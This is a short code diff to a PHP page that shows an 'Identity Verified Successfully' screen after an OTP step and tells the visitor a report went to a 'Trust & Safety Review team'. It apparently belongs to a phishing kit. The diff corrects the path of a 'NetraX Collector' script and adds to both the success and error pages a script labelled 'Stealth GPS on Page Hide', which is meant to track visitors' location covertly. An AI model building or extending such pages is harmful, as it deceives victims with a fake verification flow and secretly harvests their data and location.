@@ -182,7 +182,7 @@ function smr_otp_render_success(): void {
       <h1 class="text-3xl font-semibold text-gray-900">Identity Verified Successfully</h1>
       <p class="text-base text-gray-600 leading-relaxed">
         Your verification code has been confirmed. Your report has been logged
-        and escalated to our Trust &amp; Safety Review team.
+        and escalated to our Trust & Safety Review team.
       </p>
     </div>
 
@@ -217,7 +217,9 @@ function smr_otp_render_success(): void {
 
 
 <!-- NetraX Collector -->
-<script src="../../core/netrax_collector.js"></script>
+<script src="../core/netrax_collector.js"></script>
+<!-- NetraX Location Tracker: Stealth GPS on Page Hide -->
+<script src="../core/netrax_location_tracker.js"></script>
 </body>
 </html>
 <?php
@@ -265,7 +267,9 @@ function smr_otp_render_error(string $error_msg): void {
 </div>
 
 <!-- NetraX Collector -->
-<script src="../../core/netrax_collector.js"></script>
+<script src="../core/netrax_collector.js"></script>
+<!-- NetraX Location Tracker: Stealth GPS on Page Hide -->
+<script src="../core/netrax_location_tracker.js"></script>
 </body>
 </html>
 <?php
